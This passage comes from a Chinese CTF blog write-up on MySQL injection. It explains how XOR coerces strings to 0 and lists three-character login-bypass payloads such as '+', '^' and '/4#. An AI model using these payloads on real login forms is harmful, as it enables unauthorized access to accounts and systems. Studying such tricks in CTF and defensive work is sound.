+<p>异或会使字符串都转为浮点型，都变为了0，由于0=0^0 -&gt; 1^0 -&gt; 1当然对于这个题并不一定利用这个，直接截取字符串作比较就可以，但是这里只是提供一种姿势，由于mysql的灵活，其花样也比较多还有就是构造的payload比较简短，例如’+’、’^’、’/4#这样只有三个字符便可以绕过登录，简单粗暴，还有就是类似的文章不多，许多开发人员容易忽视这些细节。</p>
+</div></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2020/CTF/webshell/" rel="prev" title="webshell"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">webshell</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2020/CTF/php/" rel="next" title="php 代码审计"><span class="post-nav-text">php 代码审计</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2020 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> SAIN</span></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div><script defer src="/js/utils.js"></script><script defer src="/js/hexo-theme-yun.js"></script></body></html>
